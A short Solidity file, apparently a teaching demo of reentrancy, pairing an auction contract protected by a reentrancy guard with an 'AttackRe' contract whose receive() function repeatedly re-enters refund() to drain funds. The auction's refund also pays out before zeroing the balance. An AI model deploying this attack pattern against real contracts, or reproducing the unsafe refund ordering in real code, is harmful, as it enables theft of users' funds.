// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract AuctionRe {
    mapping(address => uint) public bidders;
    bool private locked;

    modifier reentrancyGuard() {
        require(!locked, "don't hack me please");
        locked = true;
        _;
        locked = false;
    }

    function bid() external payable {
        bidders[msg.sender] += msg.value;
    }

    function refund() external reentrancyGuard {
        address bidder = msg.sender;

        if(bidders[bidder] > 0) {
            (bool success,) = bidder.call{value: bidders[bidder]}("");
             require(success, "failed!");
             bidders[bidder] = 0;
        }
    }

    function currentBalance() external view returns(uint) {
        return address(this).balance;
    }
}

contract AttackRe {
    uint constant SUM = 1 ether;
    AuctionRe auction;

    constructor(address _auction) {
        auction = AuctionRe(_auction);
    }

    function doBid() external payable {
        auction.bid{value: SUM}();
    }

    function attack() external {
        auction.refund();
    }
    
    receive() external payable {
        if(auction.currentBalance() >= SUM) {
        auction.refund();
        }
    }
}
